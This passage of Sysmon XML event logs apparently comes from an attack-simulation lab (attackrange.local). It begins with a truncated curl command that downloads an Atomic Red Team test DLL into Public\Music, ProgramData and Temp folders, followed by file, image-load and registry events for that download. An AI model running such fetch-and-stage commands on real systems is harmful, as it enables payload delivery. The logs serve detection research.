https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.315328900Z'/><EventRecordID>34354152</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.314</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.302629700Z'/><EventRecordID>34354151</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.301</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetFilename'>C:\Users\Public\Music\allthethingsx64.dll</Data><Data Name='CreationUtcTime'>2021-10-19 16:32:42.237</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>23</EventID><Version>5</Version><Level>4</Level><Task>23</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.302059100Z'/><EventRecordID>34354150</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.301</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetFilename'>C:\Users\Public\Music\allthethingsx64.dll</Data><Data Name='Hashes'>MD5=BB806E36DA8AF680E030BAC2EEA80DAF,SHA256=14E89184687F07212D10C5FD7CB70781982D43B6EA51B74D489A1F4E6FCE72BA</Data><Data Name='IsExecutable'>false</Data><Data Name='Archived'>true</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.278395100Z'/><EventRecordID>34354149</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.277</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\bcryptprimitives.dll</Data><Data Name='FileVersion'>10.0.14393.4583 (rs1_release.210730-1850)</Data><Data Name='Description'>Windows Cryptographic Primitives Library</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>bcryptprimitives.dll</Data><Data Name='Hashes'>MD5=8AAF6E1B14B9210052FFF90E25926D63,SHA256=F2120C8E63EA94F8618B31319A534731C16D8FDD58B0E1E70217D72A39D78353</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.278171400Z'/><EventRecordID>34354148</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.277</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\cryptbase.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Base cryptographic API DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>cryptbase.dll</Data><Data Name='Hashes'>MD5=51FCB0FDEFCB9A3E4A1DC8C8673BC63C,SHA256=63A0E1A76B7ABCF56E44B548568649FFB6B5609402746D48A4DC77CCED20F5FE</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.277877700Z'/><EventRecordID>34354147</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.276</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\rsaenh.dll</Data><Data Name='FileVersion'>10.0.14393.4467 (rs1_release.210604-1844)</Data><Data Name='Description'>Microsoft Enhanced Cryptographic Provider</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>rsaenh.dll</Data><Data Name='Hashes'>MD5=28140830C342F475A597B2D54C42DFFA,SHA256=99E23D0177C6DC59AD72DEEC46CFB995828EF567F001261BC65532B6DDEAD862</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.276850500Z'/><EventRecordID>34354146</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.276</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\cryptsp.dll</Data><Data Name='FileVersion'>10.0.14393.2969 (rs1_release.190503-1820)</Data><Data Name='Description'>Cryptographic Service Provider API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>cryptsp.dll</Data><Data Name='Hashes'>MD5=9500AE4C4B639FEAEED0CC6C39F45149,SHA256=C1055D4B9A854282336A5404CA0FCB1A2EBC3417600035338C9CDFC7B8D0778C</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.265270600Z'/><EventRecordID>34354145</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.264</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\bcrypt.dll</Data><Data Name='FileVersion'>10.0.14393.4583 (rs1_release.210730-1850)</Data><Data Name='Description'>Windows Cryptographic Primitives Library</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>bcrypt.dll</Data><Data Name='Hashes'>MD5=63231EA984BC614584102A96D4F35CB4,SHA256=13C5BD283C01B0D50D8D0D99E88FC67F9234FA14A6860AB2B6EE552199FF6A74</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.264913800Z'/><EventRecordID>34354144</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.264</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\FWPUCLNT.DLL</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>FWP/IPsec User-Mode API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>fwpuclnt.dll</Data><Data Name='Hashes'>MD5=A65FA613342B08E0F760D8B13B9C135A,SHA256=C64A1EC862188D2EE1202DB02BFBF4E2DD56780905E509012799EB57FC9A88ED</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.263988200Z'/><EventRecordID>34354143</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.263</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.263923000Z'/><EventRecordID>34354142</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.263</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.263859100Z'/><EventRecordID>34354141</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.263</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.263789500Z'/><EventRecordID>34354140</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.263</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.263657600Z'/><EventRecordID>34354139</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.262</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\rasadhlp.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Remote Access AutoDial Helper</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>rasadhlp.dll</Data><Data Name='Hashes'>MD5=FAE8D0480BDD905EEA453D3A57C8D5C6,SHA256=C1531223B8201B344A6A6474CB2D9B8A8C632250A3A6F472EC5E2D7D28ADD94C</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.263013300Z'/><EventRecordID>34354138</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.262</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.262948600Z'/><EventRecordID>34354137</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.262</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.262875300Z'/><EventRecordID>34354136</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.262</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-063B-01000000F101}</Data><Data Name='ProcessId'>5456</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
